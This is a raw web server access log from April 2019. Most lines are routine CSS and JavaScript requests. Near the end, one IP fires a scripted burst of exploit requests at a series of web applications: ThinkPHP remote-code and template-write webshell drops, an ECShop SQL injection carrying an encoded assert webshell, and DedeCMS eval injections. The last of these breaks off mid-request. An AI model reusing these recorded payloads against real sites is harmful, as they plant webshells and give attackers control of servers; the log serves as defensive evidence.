175.181.156.182 - - [19/Apr/2019:03:47:48 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; MAXTHON)" "-"
175.181.156.182 - - [19/Apr/2019:03:47:48 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; MAXTHON)" "-"
111.67.206.32 - - [19/Apr/2019:03:47:55 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 200 8194 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1)" "-"
61.140.233.248 - - [19/Apr/2019:03:47:55 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 200 8194 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; 360SE)" "-"
61.140.233.248 - - [19/Apr/2019:03:47:55 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 200 8887 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; 360SE)" "-"
111.67.206.32 - - [19/Apr/2019:03:47:55 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 200 8887 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1)" "-"
122.114.143.30 - - [19/Apr/2019:03:48:03 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 200 8194 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 360SE)" "-"
122.114.143.30 - - [19/Apr/2019:03:48:03 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 200 8887 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 360SE)" "-"
116.255.189.35 - - [19/Apr/2019:03:48:07 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 11.0; Windows NT 6.3; 360SE)" "-"
116.255.189.35 - - [19/Apr/2019:03:48:08 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 11.0; Windows NT 6.3; 360SE)" "-"
61.140.233.248 - - [19/Apr/2019:03:48:13 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; 360SE)" "-"
61.140.233.248 - - [19/Apr/2019:03:48:13 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; 360SE)" "-"
69.30.202.252 - - [19/Apr/2019:03:48:22 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 200 8194 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; SE 2.x)" "-"
116.255.167.49 - - [19/Apr/2019:03:48:23 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 200 8194 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; 360SE)" "-"
116.255.167.49 - - [19/Apr/2019:03:48:23 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 200 8887 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; 360SE)" "-"
69.30.202.252 - - [19/Apr/2019:03:48:24 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 200 8887 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; SE 2.x)" "-"
180.136.208.207 - - [19/Apr/2019:03:48:26 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 200 8194 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)" "-"
180.136.208.207 - - [19/Apr/2019:03:48:27 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 200 8887 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)" "-"
59.53.63.21 - - [19/Apr/2019:03:48:27 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 200 8194 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; QIHU 360EE)" "-"
59.53.63.21 - - [19/Apr/2019:03:48:27 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 200 8887 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; QIHU 360EE)" "-"
222.219.215.158 - - [19/Apr/2019:03:48:28 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 200 8194 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; 360SE)" "-"
222.219.215.158 - - [19/Apr/2019:03:48:28 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 200 8887 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; 360SE)" "-"
111.230.199.151 - - [19/Apr/2019:03:48:34 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 200 8194 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1)" "-"
111.230.199.151 - - [19/Apr/2019:03:48:34 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 200 8887 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1)" "-"
1.207.32.152 - - [19/Apr/2019:03:48:38 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 200 8194 "https://bz.zzzmh.cn/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET4.0C; .NET4.0E; InfoPath.2)" "-"
1.207.32.152 - - [19/Apr/2019:03:48:38 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 200 8887 "https://bz.zzzmh.cn/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET4.0C; .NET4.0E; InfoPath.2)" "-"
69.30.202.252 - - [19/Apr/2019:03:48:42 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; SE 2.x)" "-"
69.30.202.252 - - [19/Apr/2019:03:48:42 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; SE 2.x)" "-"
140.121.135.50 - - [19/Apr/2019:03:48:44 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 200 8194 "https://bz.zzzmh.cn/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; .NET4.0C; .NET4.0E)" "-"
140.121.135.50 - - [19/Apr/2019:03:48:45 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 200 8887 "https://bz.zzzmh.cn/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; .NET4.0C; .NET4.0E)" "-"
180.136.208.207 - - [19/Apr/2019:03:48:46 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)" "-"
180.136.208.207 - - [19/Apr/2019:03:48:46 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)" "-"
42.232.125.187 - - [19/Apr/2019:03:48:47 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 200 8194 "https://bz.zzzmh.cn/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; 360SE)" "-"
42.232.125.187 - - [19/Apr/2019:03:48:47 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 200 8887 "https://bz.zzzmh.cn/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; 360SE)" "-"
116.255.167.49 - - [19/Apr/2019:03:48:49 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; 360SE)" "-"
59.53.63.21 - - [19/Apr/2019:03:48:50 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 200 8194 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; QIHU 360EE)" "-"
222.219.215.158 - - [19/Apr/2019:03:48:51 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; 360SE)" "-"
222.219.215.158 - - [19/Apr/2019:03:48:52 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; 360SE)" "-"
45.125.12.130 - - [19/Apr/2019:03:48:56 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36" "-"
45.125.12.130 - - [19/Apr/2019:03:48:56 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36" "-"
111.230.199.151 - - [19/Apr/2019:03:48:59 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1)" "-"
111.230.199.151 - - [19/Apr/2019:03:48:59 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1)" "-"
1.207.32.152 - - [19/Apr/2019:03:49:00 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET4.0C; .NET4.0E; InfoPath.2)" "-"
1.207.32.152 - - [19/Apr/2019:03:49:00 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET4.0C; .NET4.0E; InfoPath.2)" "-"
167.86.99.203 - - [19/Apr/2019:03:49:04 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 200 8194 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; WOW64; Trident/4.0; .NET4.0C; .NET4.0E)" "-"
167.86.99.203 - - [19/Apr/2019:03:49:04 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 200 8887 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; WOW64; Trident/4.0; .NET4.0C; .NET4.0E)" "-"
42.232.125.187 - - [19/Apr/2019:03:49:07 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; 360SE)" "-"
42.232.125.187 - - [19/Apr/2019:03:49:08 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; 360SE)" "-"
122.228.189.106 - - [19/Apr/2019:03:49:09 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" "-"
122.228.189.106 - - [19/Apr/2019:03:49:09 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" "-"
140.143.204.101 - - [19/Apr/2019:03:49:11 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 200 8194 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; 360SE)" "-"
140.143.204.101 - - [19/Apr/2019:03:49:11 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 200 8887 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; 360SE)" "-"
140.121.135.50 - - [19/Apr/2019:03:49:15 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; .NET4.0C; .NET4.0E)" "-"
140.121.135.50 - - [19/Apr/2019:03:49:16 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; .NET4.0C; .NET4.0E)" "-"
167.86.99.203 - - [19/Apr/2019:03:49:24 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; WOW64; Trident/4.0; .NET4.0C; .NET4.0E)" "-"
167.86.99.203 - - [19/Apr/2019:03:49:27 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; WOW64; Trident/4.0; .NET4.0C; .NET4.0E)" "-"
140.143.204.101 - - [19/Apr/2019:03:49:31 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; 360SE)" "-"
140.143.204.101 - - [19/Apr/2019:03:49:31 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; 360SE)" "-"
116.196.17.59 - - [19/Apr/2019:03:49:40 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 200 8194 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1)" "-"
116.196.17.59 - - [19/Apr/2019:03:49:41 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 200 8887 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1)" "-"
116.196.17.59 - - [19/Apr/2019:03:49:58 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1)" "-"
116.196.17.59 - - [19/Apr/2019:03:49:58 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1)" "-"
122.247.184.187 - - [19/Apr/2019:03:50:05 +0800] "POST /FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1" 301 185 "http://zzzmh.cn/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" "-"
122.247.184.187 - - [19/Apr/2019:03:50:05 +0800] "POST /FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1" 301 185 "http://zzzmh.cn/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" "-"
122.247.184.187 - - [19/Apr/2019:03:50:05 +0800] "GET /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 301 185 "http://zzzmh.cn/index.php?m=member&c=index&a=register&siteid=1" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" "-"
122.247.184.187 - - [19/Apr/2019:03:50:05 +0800] "POST /admin_aspcms/_system/AspCms_SiteSetting.asp HTTP/1.1" 301 185 "http://zzzmh.cn/admin_aspcms/_system/AspCms_SiteSetting.asp" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" "-"
122.247.184.187 - - [19/Apr/2019:03:50:05 +0800] "GET /plus/moon.php HTTP/1.1" 301 185 "http://zzzmh.cn/plus/moon.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" "-"
122.247.184.187 - - [19/Apr/2019:03:50:05 +0800] "POST /plus/90sec.php HTTP/1.1" 301 185 "http://zzzmh.cn/plus/90sec.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" "-"
122.247.184.187 - - [19/Apr/2019:03:50:05 +0800] "POST /utility/convert/index.php?a=config&source=d7.2_x2.0 HTTP/1.1" 301 185 "http://zzzmh.cn/utility/convert/index.php?a=config&source=d7.2_x2.0" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" "-"
122.247.184.187 - - [19/Apr/2019:03:50:05 +0800] "POST /utility/convert/data/config.inc.php HTTP/1.1" 301 185 "http://zzzmh.cn/utility/convert/data/config.inc.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" "-"
122.247.184.187 - - [19/Apr/2019:03:50:05 +0800] "GET /uploads/dede/sys_verifies.php?action=getfiles&refiles%5B0%5D=123&refiles%5B1%5D=%5C%22;eval($_POST%5Bysy%5D);die();// HTTP/1.1" 301 185 "http://zzzmh.cn/uploads/dede/sys_verifies.php?action=getfiles&refiles[0]=123&refiles[1]=\x5C%22;eval($_POST[ysy]);die();//" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" "-"
122.247.184.187 - - [19/Apr/2019:03:50:05 +0800] "POST /uploads/dede/sys_verifies.php?action=down HTTP/1.1" 301 185 "http://zzzmh.cn/uploads/dede/sys_verifies.php?action=down" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" "-"
122.247.184.187 - - [19/Apr/2019:03:50:05 +0800] "POST /index.php/api/Uploadify/preview HTTP/1.1" 301 185 "http://zzzmh.cn/index.php/api/Uploadify/preview" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" "-"
122.247.184.187 - - [19/Apr/2019:03:50:05 +0800] "GET /user.php?act=login HTTP/1.1" 301 185 "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\x22num\x22;s:288:\x22*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10-- -\x22;s:2:\x22id\x22;s:3:\x22'/*\x22;}" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" "-"
122.247.184.187 - - [19/Apr/2019:03:50:05 +0800] "POST /fdgq.php HTTP/1.1" 301 185 "http://zzzmh.cn/fdgq.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" "-"
122.247.184.187 - - [19/Apr/2019:03:50:05 +0800] "GET /?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=cnsfn.php&content=%3C?php%20@assert($_REQUEST%5B%22ysy%22%5D);?%3Eysydjsjxbei37 HTTP/1.1" 301 185 "http://zzzmh.cn/?s=index/\x5Cthink\x5Ctemplate\x5Cdriver\x5Cfile/write&cacheFile=cnsfn.php&content=<?php @assert($_REQUEST[\x22ysy\x22]);?>ysydjsjxbei37" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" "-"
122.247.184.187 - - [19/Apr/2019:03:50:05 +0800] "GET /cnsfn.php HTTP/1.1" 301 185 "http://zzzmh.cn/cnsfn.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" "-"
122.247.184.187 - - [19/Apr/2019:03:50:05 +0800] "GET /user.php?act=login HTTP/1.1" 301 185 "45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:\x22num\x22;s:297:\x22*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A336C7A655846784C6E426F634363734A7A772F63476877494756325957776F4A46395154314E5557336C7A655630704F79412F506963702729293B2F2F7D787878,10-- -\x22;s:2:\x22id\x22;s:11:\x22-1' UNION/*\x22;}45ea207d7a2b68c49582d2d22adf953a" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" "-"
122.247.184.187 - - [19/Apr/2019:03:50:05 +0800] "POST /ysyqq.php HTTP/1.1" 301 185 "http://zzzmh.cn/ysyqq.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" "-"
122.247.184.187 - - [19/Apr/2019:03:50:05 +0800] "GET /?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=ickxm.php&vars%5B1%5D%5B%5D=%3C?php%20@assert($_REQUEST%5B%22ysy%22%5D);?%3Eysydjsjxbei37$ HTTP/1.1" 301 185 "http://zzzmh.cn/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=ickxm.php&vars[1][]=<?php @assert($_REQUEST[\x22ysy\x22]);?>ysydjsjxbei37$" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" "-"
122.247.184.187 - - [19/Apr/2019:03:50:06 +0800] "GET /ickxm.php HTTP/1.1" 301 185 "http://zzzmh.cn/ickxm.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" "-"
122.247.184.187 - - [19/Apr/2019:03:50:06 +0800] "GET /plus/mytag_js.php?dopost=saveedit&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114&arrs1%5B%5D=101&arrs1%5B%5D=102&arrs1%5B%5D=105&arrs1%5B%5D=120&arrs2%5B%5D=109&arrs2%5B%5D=121&arrs2%5B%5D=116&arrs2%5B%5D=97&arrs2%5B%5D=103&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=40&arrs2%5B%5D=97&arrs2%5B%5D=105&arrs2%5B%5D=100&arrs2%5B%5D=44&arrs2%5B%5D=110&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=109&arrs2%5B%5D=98&arrs2%5B%5D=111&arrs2%5B%5D=100&arrs2%5B%5D=121&arrs2%5B%5D=41&arrs2%5B%5D=32&arrs2%5B%5D=86&arrs2%5B%5D=65&arrs2%5B%5D=76&arrs2%5B%5D=85&arrs2%5B%5D=69&arrs2%5B%5D=83&arrs2%5B%5D=40&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=104&arrs2%5B%5D=111&arrs2%5B%5D=32&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=100&arrs2%5B%5D=101&arrs2%5B%5D=100&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=109&arrs2%5B%5D=115&arrs2%5B%5D=32&arrs2%5B%5D=53&arrs2%5B%5D=46&arrs2%5B%5D=55&arrs2%5B%5D=32&arrs2%5B%5D=48&arrs2%5B%5D=100&arrs2%5B%5D=97&arrs2%5B%5D=121&arrs2%5B%5D=60&arrs2%5B%5D=98&arrs2%5B%5D=114&arrs2%5B%5D=62&arrs2%5B%5D=103&arrs2%5B%5D=117&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=101&arrs2%5B%5D=44&arrs2%5B%5D=32&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=115&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=46&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=103&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=59&arrs2%5B%5D=64&arrs2%5B%5D=112&arrs2%5B%5D=114&arrs2%5B%5D=101&arrs2%5B%5D=103&arrs2%5B%5D=95&arrs2%5B%5D=114&arrs2%5B%5D=101&arrs2%5B%5D=112&arrs2%5B%5D=108&arrs2%5B%5D=97&arrs2%5B%5D=99&arrs2%5B%5D=101&arrs2%5B%5D=40&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=47&arrs2%5B%5D=91&arrs2%5B%5D=99&arrs2%5B%5D=111&arrs2%5B%5D=112&arrs2%5B%5D=121&arrs2%5B%5D=114&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=104&arrs2%5B%5D=116&arrs2%5B%5D=93&arrs2%5B%5D=47&arrs2%5B%5D=101&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=44&arrs2%5B%5D=36&arrs2%5B%5D=95&arrs2%5B%5D=82&arrs2%5B%5D=69&arrs2%5B%5D=81&arrs2%5B%5D=85&arrs2%5B%5D=